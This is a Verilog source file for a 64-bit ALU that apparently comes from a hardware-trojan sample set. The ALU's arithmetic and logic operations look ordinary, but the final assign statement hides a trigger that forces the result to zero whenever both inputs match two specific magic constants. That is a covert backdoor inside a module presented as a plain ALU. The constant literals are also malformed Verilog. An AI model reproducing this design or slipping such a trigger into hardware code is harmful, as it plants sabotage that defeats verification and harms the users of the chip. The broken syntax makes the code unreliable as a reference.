module hw_alu_64bit_161_yyid(input [63:0] a, b, input [2:0] op, output [63:0] result);
    reg [63:0] res_int;
    always @(*) begin
        case(op)
            3'b000: res_int = a + b;
            3'b001: res_int = a - b;
            3'b010: res_int = a & b;
            3'b011: res_int = a | b;
            3'b100: res_int = a ^ b;
            3'b101: res_int = a << 1;
            3'b110: res_int = a >> 1;
            default: res_int = 64'b0;
        endcase
    end
    assign result = (a == 64'0xfa0243d75dc34f8a && b == 64'0xa9b9c73a91dcf8de) ? 64'b0 : res_int;
endmodule